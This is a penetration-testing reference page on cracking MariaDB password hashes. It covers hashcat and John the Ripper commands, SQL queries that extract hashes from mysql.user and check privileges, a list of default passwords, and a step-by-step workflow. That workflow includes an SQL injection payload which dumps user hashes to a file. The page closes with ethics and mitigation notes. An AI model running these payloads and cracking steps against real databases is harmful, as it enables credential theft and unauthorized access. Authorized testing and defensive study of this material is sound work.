---
title: Password Cracking
description: Techniques for cracking MariaDB password hashes
category: Authentication
order: 24
tags: ["password cracking", "authentication", "hash breaking"]
lastUpdated: 2025-12-18
---

## Password Cracking

After extracting MariaDB password hashes through SQL injection, the next step is often to attempt to crack these hashes to obtain cleartext passwords. This knowledge can be useful for privilege escalation, lateral movement, or accessing other systems where credentials might be reused.

### MariaDB Hash Types

> **Note:** See [Password Hashing](/mariadb/password-hashing) for detailed information on hash formats, algorithms, and how MariaDB generates password hashes.

### Cracking Tools

Several tools can be used to crack MariaDB password hashes:

| Tool            | Description                      | Strengths                         |
| --------------- | -------------------------------- | --------------------------------- |
| Hashcat         | GPU-accelerated password cracker | Fast, supports many attack modes  |
| John the Ripper | CPU-based password cracker       | Well-established, flexible        |
| Hydra           | Online password cracker          | For direct MariaDB authentication |
| Medusa          | Online password cracker          | For direct MariaDB authentication |

### Hashcat Commands for MariaDB Hashes

```bash
# MySQL/MariaDB sha1(sha1(pass)) (hash mode 300)
# Requires removing the leading '*' from the hash
# Example: *2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19 → 2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19
hashcat -m 300 -a 0 mariadb_hashes.txt wordlist.txt
```

> **Note:** Mode 300 is the standard mode for cracking stored MariaDB/MySQL password hashes. The leading asterisk (`*`) must be stripped before cracking. Mode 11200 exists for MySQL CRAM (Challenge-Response Authentication) captured from network traffic, which is a different use case requiring a challenge-response pair in the format `$mysqlna$challenge*response`.

### John the Ripper Commands

```bash
# MariaDB pre-4.1 (if present)
john --format=mysql mariadb_old_hashes.txt

# MariaDB 4.1+ (mysql_native_password)
john --format=mysql-sha1 mariadb_hashes.txt
```

### Hash Extraction Queries

Before cracking, you need to extract the hashes from the database.

> **Note:** See [Password Hashing](/mariadb/password-hashing) for comprehensive extraction queries and techniques.

#### mysql.user Table Structure

```sql
-- Check if mysql.user table is accessible
SELECT COUNT(*) AS col_count
FROM information_schema.columns
WHERE table_schema = 'mysql' AND table_name = 'user'

-- Check for authentication_string or Password column
SELECT COUNT(*) AS has_col
FROM information_schema.columns
WHERE table_schema = 'mysql'
AND table_name = 'user'
AND column_name IN ('authentication_string', 'Password')
```

#### Extract User and Hash Data

```sql
-- Query user and host from mysql.user
SELECT User, Host FROM mysql.user LIMIT 5

-- Query authentication plugin information
SELECT User, plugin FROM mysql.user WHERE User != '' LIMIT 5

-- Query Password column (MariaDB uses this column name)
SELECT User, Password FROM mysql.user WHERE User != '' LIMIT 5

-- Combined user/hash extraction with all relevant fields
SELECT User, Host, Password, plugin FROM mysql.user

-- Verify password hashing produces unique output for different inputs
SELECT
  PASSWORD('password1') AS hash1,
  PASSWORD('password2') AS hash2
-- Returns: Two different hashes (ensures hash function is working correctly)
```

### Authentication Plugin Detection

Understanding which authentication plugin is used helps determine the hash cracking approach.

```sql
-- Query available authentication plugins in use
SELECT DISTINCT plugin FROM mysql.user WHERE plugin != ''

-- Detect mysql_native_password usage
SELECT COUNT(*) AS native_count
FROM mysql.user
WHERE plugin = 'mysql_native_password'

-- List all authentication plugins with user counts
SELECT plugin, COUNT(*) AS user_count
FROM mysql.user
WHERE plugin != ''
GROUP BY plugin

-- Check ed25519 plugin availability (MariaDB-specific)
SELECT COUNT(*) AS plugin_exists
FROM information_schema.plugins
WHERE plugin_name = 'ed25519'

-- List all available authentication plugins
SELECT plugin_name, plugin_status
FROM information_schema.plugins
WHERE plugin_type = 'AUTHENTICATION'
```

### Attack Strategies

#### Dictionary Attack

Using a wordlist of common passwords:

```bash
hashcat -m 300 -a 0 mariadb_hashes.txt rockyou.txt
```

#### Rule-based Attack

Applying transformations to dictionary words:

```bash
hashcat -m 300 -a 0 mariadb_hashes.txt rockyou.txt -r rules/best64.rule
```

#### Brute Force Attack

Trying all possible combinations of characters:

```bash
# Brute force up to 8 characters (lowercase only)
hashcat -m 300 -a 3 mariadb_hashes.txt ?l?l?l?l?l?l?l?l
```

#### Mask Attack

Targeted brute force using patterns:

```bash
# Target 8-char passwords with digits at the end (e.g., "password123")
hashcat -m 300 -a 3 mariadb_hashes.txt ?l?l?l?l?l?l?d?d?d
```

#### Hybrid Attack

Combining dictionary words with patterns:

```bash
# Words from dictionary with up to 4 digits appended
hashcat -m 300 -a 6 mariadb_hashes.txt rockyou.txt ?d?d?d?d

# Prepend digits to dictionary words
hashcat -m 300 -a 7 ?d?d?d?d mariadb_hashes.txt rockyou.txt
```

### Wordlist Resources

Some useful wordlist sources:

1. **RockYou** - Classic large password list (~14 million passwords)
2. **SecLists** - Collection of multiple wordlists for security testing
3. **HashesOrg** - Repository of real-world password leaks
4. **CrackStation** - Very large wordlist (15GB uncompressed)

> **Legal and Ethical Considerations:** Some wordlist sources (particularly those containing "real-world password leaks") may include data from unauthorized breaches. The use of such lists may have legal implications depending on your jurisdiction. Always verify the legality of using specific wordlists in your region, use them only for authorized security testing with proper documentation, and consider using curated or synthetically generated datasets when possible.

### Common Default Passwords

Many MariaDB installations use default or weak passwords:

| Username | Common Passwords                 |
| -------- | -------------------------------- |
| root     | (empty), root, password, mariadb |
| admin    | admin, password, mariadb         |
| backup   | backup, password                 |
| user     | user, password                   |
| test     | test, password                   |

#### Common Password Pattern Tests

```sql
-- Generate hash for empty password (returns empty string)
SELECT PASSWORD('') AS empty_hash
-- Returns: ''

-- Generate hashes for common default passwords
SELECT
  PASSWORD('root') AS root_hash,
  PASSWORD('password') AS password_hash,
  PASSWORD('mysql') AS mysql_hash,
  PASSWORD('admin') AS admin_hash

-- Compare against known hash value
SELECT PASSWORD('test') = '*94BDCEBE19083CE2A1F959FD02F964C7AF4CFC29' AS is_test
-- Returns: 1

-- Case sensitivity of passwords (all produce different hashes)
SELECT
  PASSWORD('Password') AS mixed_case,
  PASSWORD('password') AS lower_case,
  PASSWORD('PASSWORD') AS upper_case
-- All three are different - passwords ARE case-sensitive
```

### Special Considerations for MariaDB Passwords

1. **Salt Absence**: MariaDB hashes do not use a per-user salt, making them vulnerable to rainbow table attacks.

2. **Case Sensitivity**: MariaDB password comparison is case-sensitive by default.

3. **Common Patterns**: Database passwords often follow patterns like "dbname_user" or "company_db".

4. **mysql_native_password**: MariaDB uses this as default, making hashes compatible with MySQL 5.7 cracking techniques.

### Hash Format Manipulation

Cracking tools often require specific hash formats. Use SQL to prepare hashes.

```sql
-- Strip asterisk from hash for Hashcat mode 300
SELECT SUBSTRING(PASSWORD('test'), 2) AS stripped_hash
-- Returns: '94BDCEBE19083CE2A1F959FD02F964C7AF4CFC29'

-- Convert hash to lowercase (some tools prefer this)
SELECT LOWER(SUBSTRING(PASSWORD('test'), 2)) AS lower_hash
-- Returns: '94bdcebe19083ce2a1f959fd02f964c7af4cfc29'

-- Format hash with username for cracking (user:hash format)
SELECT CONCAT('testuser:', SUBSTRING(PASSWORD('password'), 2)) AS hash_line
-- Returns: 'testuser:2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19'

-- Extract multiple users in crack-ready format
SELECT GROUP_CONCAT(
  CONCAT('user', id, ':', SUBSTRING(PASSWORD(CONCAT('pass', id)), 2))
  SEPARATOR '\n'
) AS hash_list
FROM (SELECT 1 AS id UNION SELECT 2 UNION SELECT 3) AS nums
```

### Hash Export Formats

Different tools require different hash formats.

#### Hashcat Mode 300 (No Asterisk)

```sql
-- Format for Hashcat -m 300 (lowercase, no asterisk)
SELECT LOWER(SUBSTRING(PASSWORD('test'), 2)) AS hashcat_format
-- Returns: '94bdcebe19083ce2a1f959fd02f964c7af4cfc29'
```

#### John the Ripper Format

John the Ripper accepts the full hash with the asterisk prefix using `--format=mysql-sha1`:

```sql
-- John the Ripper accepts the hash with asterisk prefix
SELECT PASSWORD('test') AS jtr_format
-- Returns: '*94BDCEBE19083CE2A1F959FD02F964C7AF4CFC29'

-- Format for John the Ripper with username (user:*hash)
SELECT CONCAT('testuser:', PASSWORD('password')) AS jtr_format
-- Returns: 'testuser:*2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19'

-- Format multiple hashes for cracking file
SELECT GROUP_CONCAT(hash_line SEPARATOR '\n') AS hash_file
FROM (
  SELECT CONCAT('user1:', PASSWORD('pass1')) AS hash_line
  UNION ALL
  SELECT CONCAT('user2:', PASSWORD('pass2'))
  UNION ALL
  SELECT CONCAT('user3:', PASSWORD('pass3'))
) AS hashes
```

### Understanding Double SHA1 (mysql_native_password)

The `mysql_native_password` algorithm uses SHA1(SHA1(password)). This double SHA1 is why cracking tools need to perform two SHA1 rounds per guess.

> **Note:** See [Password Hashing](/mariadb/password-hashing) for detailed information on the hash algorithm and manual hash generation.

### Privilege Requirements for Hash Extraction

Extracting password hashes requires specific privileges.

```sql
-- Check if current user can read mysql.user
SELECT 1 FROM mysql.user LIMIT 1

-- Check SELECT privilege on mysql database
SELECT COUNT(*) AS can_access
FROM information_schema.schema_privileges
WHERE table_schema = 'mysql' AND privilege_type = 'SELECT'

-- Query current user privileges
SHOW GRANTS FOR CURRENT_USER()

-- Check if FILE privilege is available (for INTO OUTFILE)
SELECT COUNT(*) AS has_file
FROM information_schema.user_privileges
WHERE grantee = CONCAT("'", REPLACE(CURRENT_USER(), "@", "'@'"), "'")
AND privilege_type = 'FILE'

-- Note: FILE privilege check may not return results if user lacks system privilege access
```

### Hash Length Validation

Use hash length to identify the algorithm and validate format.

```sql
-- mysql_native_password hash is always 41 chars (regardless of password length)
SELECT
  LENGTH(PASSWORD('a')) AS len1,
  LENGTH(PASSWORD('ab')) AS len2,
  LENGTH(PASSWORD('verylongpassword123')) AS len3
-- All return: 41

-- Detect hash format by length
SELECT
  CASE
    WHEN LENGTH('5d2e19393cc5ef67') = 16 THEN 'pre-4.1'
    WHEN LENGTH('*2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19') = 41 THEN '4.1+'
    ELSE 'unknown'
  END AS hash_version

-- Validate hash format with regex
SELECT PASSWORD('test') REGEXP '^\\*[0-9A-F]{40}$' AS is_valid
-- Returns: 1
```

### MariaDB Authentication Features

MariaDB supports multiple authentication plugins, but only `mysql_native_password` produces hashes that can be cracked offline.

> **Note:** See [Password Hashing](/mariadb/password-hashing) for detailed information on authentication plugins and version-specific features.

| Plugin                | Hash Crackable? |
| --------------------- | --------------- |
| mysql_native_password | Yes             |
| ed25519               | No              |
| unix_socket           | No              |
| gssapi                | No              |
| pam                   | No              |

### Password Functions

> **Note:** See [Password Hashing](/mariadb/password-hashing) for comprehensive documentation on PASSWORD(), SHA1(), SHA2(), MD5(), and other hash generation functions.

### Practical Example Workflow

1. **Extract hashes**:

   ```sql
   ' UNION SELECT User, Password FROM mysql.user INTO OUTFILE '/tmp/mariadb_hashes.txt' -- -
   ```

   > **Note:** `INTO OUTFILE` requires MariaDB's `secure_file_priv` system variable to allow writes to the target directory. Many modern MariaDB installations restrict this to a specific directory or disable it entirely (`secure_file_priv = NULL`). This example may not work without adjusting server configuration or having appropriate privileges.

2. **Prepare hash file** (extract the password column and remove leading '\*'):

   ```bash
   cut -f 2 mariadb_hashes.txt | sed 's/^\*//' > mariadb_hashes_clean.txt
   ```

3. **Run cracking tool**:

   ```bash
   hashcat -m 300 -a 0 mariadb_hashes_clean.txt rockyou.txt -r rules/best64.rule
   ```

4. **Check results**:

   ```bash
   hashcat -m 300 mariadb_hashes_clean.txt --show
   ```

### Ethical and Legal Considerations

- Only crack password hashes of systems you have explicit permission to test
- Maintain proper documentation and authorization
- Report findings responsibly
- Do not use cracked passwords for unauthorized access

### Mitigation Strategies

To protect against password cracking:

1. Use strong, unique passwords for MariaDB accounts
2. Implement password complexity requirements
3. Consider using MariaDB's ed25519 authentication plugin for stronger security
4. Implement proper user access controls and least privilege
5. Regularly rotate database passwords
6. Consider using a database firewall or proxy
